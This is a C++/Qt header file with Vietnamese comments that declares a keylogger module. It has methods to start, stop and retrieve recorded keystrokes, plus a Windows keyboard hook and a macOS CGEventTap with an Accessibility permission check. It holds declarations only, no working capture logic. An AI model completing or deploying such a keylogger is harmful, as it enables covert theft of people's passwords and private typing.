#ifndef KEYLOGGERMODULE_H
#define KEYLOGGERMODULE_H

#include <QObject>
#include <QString>
#include <QStringList>
#include <QMutex>

#ifdef Q_OS_MACOS
#include <QThread>
#endif

class KeyloggerModule : public QObject
{
    Q_OBJECT

public:
    explicit KeyloggerModule(QObject *parent = nullptr);
    ~KeyloggerModule();

    // Bắt đầu ghi phím
    QString startKeylogger();

    // Dừng ghi phím
    QString stopKeylogger();

    // Lấy dữ liệu đã ghi
    QString getKeyloggerData();

    // Kiểm tra trạng thái
    bool isRunning() const;

private:
    bool running;
    QStringList keyBuffer;
    QMutex mutex;

#ifdef Q_OS_WIN
    // Windows keyboard hook
    static KeyloggerModule* instance;
    static void* hookHandle;   // HHOOK
    static long __stdcall keyboardProc(int nCode, unsigned long long wParam, long long lParam);
#endif

#ifdef Q_OS_MACOS
    // macOS CGEventTap
    static KeyloggerModule* instance;
    void* eventTap;       // CFMachPortRef
    void* runLoopSource;  // CFRunLoopSourceRef
    QThread* tapThread;

    // Callback cho CGEventTap
    static void* eventCallback(void* proxy, unsigned long type,
                               void* event, void* userInfo);

    // Chạy run loop trong thread riêng
    void runMacEventLoop();

    // Kiểm tra Accessibility permission
    bool checkAccessibilityPermission();
#endif
};

#endif // KEYLOGGERMODULE_H
